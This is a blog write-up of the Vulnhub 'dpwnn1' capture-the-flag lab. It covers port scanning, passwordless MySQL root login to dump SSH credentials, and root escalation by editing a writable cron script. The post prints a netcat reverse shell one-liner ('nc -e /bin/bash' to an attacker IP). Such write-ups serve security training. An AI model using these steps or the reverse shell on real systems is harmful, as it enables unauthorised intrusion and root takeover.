---
layout:     post
title:      "Vulnhub - dpwnn1"
subtitle:   "Write-Up"
date:       2019-08-01 
author:     "D4mianwayne"
tag:      nmap, ctf, vulnhub
category: Vulnhub
---

# Nmap

Starting off with the nmap, using `nmap -sV -sC -A 192.168.43.59` shows us that 22, 80 and 3306 i.e. SSH, HTTP, MySQL are open respectively.

![](/img/dpwwn/nmap.png)

# HTTP and MySQL Enumeration 

I fired up the gobuster and while it was running I tried to check that HTTP server and the source in order to find something useful but somehow it's not relevant in any way and the gobuster has only given `/info.php` which as also not useful. So I tried MySQL service, using `mysql -h 192,168.43.59 -u root` which logged us into the mysql service of the machine. Using `SHOW DATABASES;` shows us that we have a database named `ssh`, selecting that database with `USE ssh` which has a table named `users` which can be seen by providing the command `SHOW TABLES;` and finally using `SELECT * FROM users` shows us that user and it's corresponding password which was `mistic:testP@$$swordmistic`.

![](/img/dpwwn/mysql.png)

# SSH Login and Root Flag

Using the credentials we found above, we logged into the ssh as user mistic. 

![](/img/dpwwn/ssh.png)

For the root, it was easy since the working directory of user mistic has a file `logrot.sh` which was a cronjob runs by the root and was collecting logs.
Checking the permission we can see that it can be edited by the user mistic so using `vi logrot.sh` and changing the mode to the input I entered the follwoing data whch will spawn the root shell as reverse callback due to that cronjob running.

```bash
[mistic@dpwwn-01 ~]$ cat logrot.sh
#!/bin/bash
nc -e /bin/bash 192.168.43.243 1234

```

Hence, spawning the root shell.

![](/img/dpwwn/root.png)

##### Root flag

Well, all the way down here for the flag:-

![](/img/dpwwn/rootflag.png)